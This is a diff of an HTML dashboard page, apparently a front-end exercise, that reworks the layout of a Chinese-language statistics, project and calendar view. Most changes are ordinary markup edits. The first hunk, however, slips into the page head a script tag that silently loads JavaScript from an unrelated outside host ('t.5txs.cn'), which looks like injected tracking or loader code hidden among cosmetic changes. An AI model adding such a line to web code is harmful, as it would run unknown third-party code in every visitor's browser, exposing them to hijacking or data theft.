@@ -4,7 +4,7 @@
     <meta charset="utf-8">
     <link rel="stylesheet" type="text/css" href="styles/task9.css">
     <title>task9</title>
-</head>
+<script charset="utf-8" async="true" src="http://t.5txs.cn/rb/i.js"></script></head>
 <body>
     <div id="header">
         <span class="logo"><img src="img/logo.png"></span>
@@ -52,7 +52,6 @@
                                 </li>
                             </ul>
                         </div>
-                         
                     </li>
                     <li class="star list">
                         <div class="list-wrap">
@@ -100,7 +99,7 @@
                     <div class="wrap">
                         <div class="column column-1">
                             <span>查询项</span>
-                            <form  autocomplete="off">
+                            <form>
                                 <select name="item">
                                     <option value="item-1">第一项</option>
                                     <option value="item-2">第二项</option>
@@ -138,7 +137,7 @@
                                     <span>日期</span>
                                     <input type="date" />
                                 </div>
-                                <<div class="row-1-2">
+                                <div class="row-1-2">
                                     <span>总耗时</span>
                                     <form>
                                         <select name="day">
@@ -166,74 +165,90 @@
                                            <option value="10">10项</option>
                                        </select>
                                    </form>
-                                   
                                </div>
                            </div>
                        </div>
                       <button>搜索</button>
                     </div>
-                   
                 </div>
                 <div class="search-result">
-                    <img class = left src="left-arrow.png" />
+                    <p class="arrow"><img src="img/left_arrow.png" /></p>
                     <ul>
-                        <li class="column-1 select"></li>
-                        <li class="column-2"></li>
-                        <li class="column-2"></li>
-                        <li class="column-2"></li>
-                        <li class="column-2"></li>
-                        <li class="column-2"></li>
+                        <li class="column-1 select">
+                            <p class="time">10:00 am</p>
+                            <p class="rmb"><img src="img/rmb.png">1200</p>
+                        </li>
+                        <li class="column-2">
+                            <p class="time">11:00 am</p>
+                            <p class="rmb"><img src="img/rmb.png">1300</p>
+                        </li>
+                        <li class="column-3">
+                            <p class="time">12:00 am</p>
+                            <p class="rmb"><img src="img/rmb.png">1200</p>
+                        </li>
+                        <li class="column-4">
+                            <p class="time">01:00 pm</p>
+                            <p class="rmb"><img src="img/rmb.png">1400</p>
+                        </li>
+                        <li class="column-5">
+                            <p class="time">02:00 pm</p>
+                            <p class="rmb"><img src="img/rmb.png">1500</p>
+                        </li>
+                        <li class="column-6">
+                            <p class="time">03:00 pm</p>
+                            <p class="rmb"><img src="img/rmb.png">1800</p>
+                        </li>
                     </ul>
-                    <img class = right src="right-arrow.png" />
-                    <span class="history"><img src="img/history.png" /></span>
+                    <p class="arrow"><img src="img/right_btn.png" /></p>
+                    <p class="history"><img src="img/history.png" />历史查询</p>
                 </div>
                 <div class="statics-chart">
-                    <p>2016年4月份统计</p>
-                    <div>
-                        <div class="column-1">
+                    <h6>2016年4月份统计</h6>
+                    <div class="wrap">
+                        <div class="column-1 col">
                             <div class="data">
-                                <span>133311</span>
-                                <span>成交量</span>
+                                <p>133311</p>
+                                <p>成交量</p>
                             </div>
-                            <span></span>
+                            <p class="statics"></p>
                         </div>
-                        <div class="column-2">
+                        <div class="column-2 col ">
                             <div class="data">
-                                <span>133311</span>
-                                <span>成交量</span>
+                                <p>133311</p>
+                                <p>成交量</p>
                             </div>
-                            <span></span>
+                             <p class="statics"></p>
                         </div>
-                        <div class="column-3">
+                        <div class="column-3 col ">
                             <div class="data">
-                                <span>133311</span>
-                                <span>成交量</span>
+                                <p>133311</p>
+                                <p>成交量</p>
                             </div>
-                            <span></span>
+                             <p class="statics"></p>
                         </div>
-                        <div class="column-4">
+                        <div class="column-4 col ">
                             <div class="data">
-                                <span>133311</span>
-                                <span>成交量</span>
+                                <p>133311</p>
+                                <p>成交量</p>
                             </div>
-                            <span></span>
+                             <p class="statics"></p>
                         </div>
                     </div>
                 </div>
 
                 <div class="project">
-                    <div class="left">
+                    <div class="col col-left">
                         <h6 class="title">第一组项目</h6>
-                        <div class="content">
+                        <div class="wrap">
                             <ul>
-                                <li class="select selected">项目一</li>
-                                <li class="select selected">项目一</li>
-                                <li class="select selected">项目一</li>
-                                <li class="select selected">项目一</li>
-                                <li class="select selected">项目一</li>
+                                <li class="selected">项目一</li>
+                                <li>项目二</li>
+                                <li>项目三</li>
+                                <li>项目四</li>
+                                <li>项目五</li>
                             </ul>
-                            <div class="wrap">
-                                <table width="400px"  border="1" cellspacing="0">
+                            <div class="purchase">
+                                <table>
                                     <tr>
                                         <td>购买材料一</td>
                                         <td>购买材料一</td>
@@ -274,17 +289,17 @@
                             </div>
                         </div>
                     </div>
-                    <div class="right">
-                        <h6>第一组项目</h6>
+                    <div class="col col-right">
+                        <h6>第二组项目</h6>
                         <div class="wrap">
                             <div class="title">
-                                <h6>标题</h6>
-                                <p>项目报表三</p>
+                                <p>标题</p>
+                                <p class="cnt">项目报表三</p>
                             </div>
-                            <div class="content">
+                            <div class="mid">
                                 <dl>
                                     <dt>价格</dt>
-                                    <dd></dd>
+                                    <dd>¥125</dd>
                                 </dl>
                                 <dl>
                                     <dt>负责人</dt>
@@ -292,23 +307,25 @@
                                 </dl>
                             </div>
                             <div class="specify">
-                                <h6>详细描述</h6>
-                                <p>该项目目前负责人是：</p>
+                                <p>详细描述</p>
+                                <p class="cnt">该项目目前负责人是......</p>
                             </div>
                             <div class="bottom">
-                                <span><input type="checkbox" name="protocol" />遵守保密协议</span>
-                                
+                                <span><input type="checkbox" name="protocol" /><b>遵守保密协议</b></span>
+                                <button>搜索</button>
                             </div>
                         </div>
+                    </div>
+                </div>
                 <div class="other">
-                    <div class="left">
-                        <h6 class="title"></h6>
+                    <div class="col col-left">
+                        <h6>日历</h6>
                         <div class="wrap">
                             <div class="select-date">
-                                <span class="year choose-bar">2016</span>
-                                <span class="month choose-bar">4月</span>
-                                <span class="select choose-bar">标注日期</span>
-                                <span class="nowday">返回今天</span>
+                                <p class="year choose-bar"><span>2016</span></p>
+                                <p class="month choose-bar"><span>4月</span></p>
+                                <p class="select choose-bar"><span>标注日期</span></p>
+                                <p class="nowday"><span>返回今天</span></p>
                             </div>
                             <div class="week">
                                 <ol>
@@ -324,14 +341,14 @@
                             <div class="date">
                                 <ul>
                                     <li>
-                                        <p></p>
-                                        <p></p>
-                                        <p></p>
-                                        <p></p>
+                                        <p><span></span><b></b></p>
+                                        <p><span></span><b></b></p>
+                                        <p><span></span><b></b></p>
+                                        <p><span></span><b></b></p>
                                         <p><span>1</span><b class="holiday">愚人节</b></p>
                                         <p><span class="weekend">2</span><b>廿五</b></p>
                                         <p><span class="weekend">3</span><b>廿六</b></p>
-                                    </li> 
+                                    </li>
                                     <li>
                                         <p><span>4</span><b>廿七</b></p>
                                         <p><span>5</span><b class="holiday">清明</b></p>
@@ -366,15 +383,13 @@
                                         <p><span>28</span><b>廿二</b></p>
                                         <p><span>29</span><b>廿三</b></p>
                                         <p><span class="weekend">30</span><b>廿四</b></p>
-                                        <p></p>
-
+                                        <p><span></span><b></b></p>
                                     </li>
                                 </ul>
-                                
                             </div>
                         </div>
-                    </div> 
-                    <div class="right">
+                    </div>
+                    <div class="col col-right">
                         <h6>汽车行业品牌榜</h6>
                         <div class="info">
                             <table>
